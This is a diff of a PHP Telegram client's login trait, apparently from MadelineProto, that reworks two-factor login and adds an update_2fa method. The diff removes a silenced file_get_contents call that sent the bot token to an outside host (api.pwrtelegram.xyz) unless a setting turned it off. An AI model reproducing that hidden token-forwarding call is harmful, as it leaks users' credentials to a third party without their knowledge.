@@ -62,9 +62,6 @@ trait Login
         $this->datacenter->sockets[$this->datacenter->curdc]->authorized = true;
         $this->updates = [];
         $this->updates_key = 0;
-        if (!isset($this->settings['pwr']['pwr']) || !$this->settings['pwr']['pwr']) {
-            @file_get_contents('https://api.pwrtelegram.xyz/bot'.$token.'/getme');
-        }
         $this->init_authorization();
         $this->logger->logger(\danog\MadelineProto\Lang::$current_lang['login_ok'], \danog\MadelineProto\Logger::NOTICE);
 
@@ -187,16 +184,22 @@ trait Login
         if ($this->authorized !== self::WAITING_PASSWORD) {
             throw new \danog\MadelineProto\Exception(\danog\MadelineProto\Lang::$current_lang['2fa_uncalled']);
         }
-        //$this->authorized = self::NOT_LOGGED_IN;
+        $this->authorized = self::NOT_LOGGED_IN;
         $hasher = new PasswordCalculator($this->logger);
         $hasher->addInfo($this->authorization);
         $this->logger->logger(\danog\MadelineProto\Lang::$current_lang['login_user'], \danog\MadelineProto\Logger::NOTICE);
-        $this->authorization = $this->method_call('auth.checkPassword', ['password_hash' => $hasher->getCheckPassword($password)], ['datacenter' => $this->datacenter->curdc]);
+        $this->authorization = $this->method_call('auth.checkPassword', ['password' => $hasher->getCheckPassword($password)], ['datacenter' => $this->datacenter->curdc]);
         $this->authorized = self::LOGGED_IN;
         $this->datacenter->sockets[$this->datacenter->curdc]->authorized = true;
         $this->init_authorization();
         $this->logger->logger(\danog\MadelineProto\Lang::$current_lang['login_ok'], \danog\MadelineProto\Logger::NOTICE);
 
         return $this->authorization;
+    }
+    public function update_2fa(array $params): bool
+    {
+        $hasher = new PasswordCalculator($this->logger);
+        $hasher->addInfo($this->method_call('account.getPassword', [], ['datacenter' => $this->datacenter->curdc]));
+        return $this->method_call('account.updatePasswordSettings', $hasher->getPassword($params), ['datacenter' => $this->datacenter->curdc]);
     }
 }
